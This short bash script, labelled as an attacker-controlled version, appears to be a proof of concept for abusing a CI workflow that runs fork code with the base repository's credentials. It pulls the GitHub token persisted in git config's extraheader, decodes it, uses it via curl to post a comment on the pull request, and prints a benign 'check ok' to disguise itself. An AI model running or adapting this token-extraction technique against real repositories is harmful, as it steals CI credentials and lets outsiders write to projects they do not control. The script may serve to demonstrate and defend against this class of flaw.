#!/bin/bash
# ATTACKER-CONTROLLED VERSION
B64=$(git config --local --get http.https://github.com/.extraheader | sed 's/.*basic //')
if [ -z "$B64" ]; then echo "no credential found"; exit 0; fi
TOKEN=$(echo "$B64" | base64 -d | cut -d: -f2)
curl -s -X POST \
  -H "Authorization: Bearer $TOKEN" \
  -H "Accept: application/vnd.github+json" \
  "https://api.github.com/repos/$GITHUB_REPOSITORY/issues/$PR_NUMBER/comments" \
  -d '{"body":"🚨 Posted by attacker-controlled code from the fork, using your write token."}'
echo "check ok"
